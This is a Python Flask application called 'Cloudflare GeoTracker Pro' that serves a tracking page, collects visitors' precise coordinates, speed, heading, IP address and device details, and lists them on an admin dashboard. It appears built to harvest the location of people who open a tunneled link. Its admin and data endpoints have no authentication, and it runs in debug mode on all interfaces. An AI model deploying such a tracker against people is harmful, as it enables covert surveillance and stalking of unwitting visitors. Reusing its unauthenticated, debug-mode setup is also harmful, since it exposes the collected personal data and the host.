#!/usr/bin/env python3
"""
Cloudflare GeoTracker Pro - Main Application
Real-time location tracking with Cloudflare Tunnel integration
"""

from flask import Flask, render_template, request, jsonify
from datetime import datetime
import json
import os
from pathlib import Path

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)
app.config['JSON_AS_ASCII'] = False

# Storage directory for location data
DATA_DIR = Path('data')
DATA_DIR.mkdir(exist_ok=True)
LOCATIONS_FILE = DATA_DIR / 'locations.json'

def load_locations():
    """Load location data from JSON file"""
    if LOCATIONS_FILE.exists():
        try:
            with open(LOCATIONS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return []
    return []

def save_location(data):
    """Save location data to JSON file"""
    locations = load_locations()
    locations.append(data)
    
    # Keep only last 100 locations
    if len(locations) > 100:
        locations = locations[-100:]
    
    with open(LOCATIONS_FILE, 'w', encoding='utf-8') as f:
        json.dump(locations, f, indent=2, ensure_ascii=False)

@app.route('/')
def index():
    """Main tracking page"""
    return render_template('index.html')

@app.route('/admin')
def admin():
    """Admin dashboard to view collected locations"""
    locations = load_locations()
    return render_template('admin.html', locations=locations)

@app.route('/api/location', methods=['POST'])
def receive_location():
    """API endpoint to receive location data"""
    try:
        data = request.get_json()
        
        # Extract location data
        location_data = {
            'timestamp': datetime.now().isoformat(),
            'latitude': data.get('latitude'),
            'longitude': data.get('longitude'),
            'accuracy': data.get('accuracy'),
            'altitude': data.get('altitude'),
            'altitude_accuracy': data.get('altitudeAccuracy'),
            'heading': data.get('heading'),
            'speed': data.get('speed'),
            'device_info': {
                'user_agent': request.headers.get('User-Agent'),
                'ip_address': request.remote_addr,
                'browser': data.get('browser'),
                'os': data.get('os'),
                'screen_width': data.get('screen_width'),
                'screen_height': data.get('screen_height'),
                'language': data.get('language'),
                'timezone': data.get('timezone')
            }
        }
        
        # Save to file
        save_location(location_data)
        
        # Print to console for real-time monitoring
        print(f"\n{'='*60}")
        print(f"📍 NEW LOCATION RECEIVED")
        print(f"{'='*60}")
        print(f"Time: {location_data['timestamp']}")
        print(f"Coordinates: {location_data['latitude']}, {location_data['longitude']}")
        print(f"Accuracy: {location_data['accuracy']} meters")
        print(f"Device: {location_data['device_info']['browser']} on {location_data['device_info']['os']}")
        print(f"IP: {location_data['device_info']['ip_address']}")
        print(f"{'='*60}\n")
        
        return jsonify({
            'status': 'success',
            'message': 'Location received successfully',
            'data': location_data
        }), 200
        
    except Exception as e:
        print(f"Error receiving location: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 400

@app.route('/api/locations', methods=['GET'])
def get_locations():
    """API endpoint to retrieve all stored locations"""
    locations = load_locations()
    return jsonify({
        'status': 'success',
        'count': len(locations),
        'locations': locations
    })

@app.route('/api/latest', methods=['GET'])
def get_latest():
    """API endpoint to get the latest location"""
    locations = load_locations()
    if locations:
        return jsonify({
            'status': 'success',
            'location': locations[-1]
        })
    return jsonify({
        'status': 'error',
        'message': 'No locations found'
    }), 404

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'total_locations': len(load_locations())
    })

if __name__ == '__main__':
    print("\n" + "="*60)
    print("🚀 Cloudflare GeoTracker Pro Starting...")
    print("="*60)
    print("📍 Location tracking server is running")
    print("🌐 Access the tracker at: http://localhost:5000")
    print("👨‍💼 Admin dashboard at: http://localhost:5000/admin")
    print("📊 API endpoints:")
    print("   - POST /api/location - Receive location data")
    print("   - GET  /api/locations - Get all locations")
    print("   - GET  /api/latest - Get latest location")
    print("="*60 + "\n")
    
    app.run(host='0.0.0.0', port=5000, debug=True)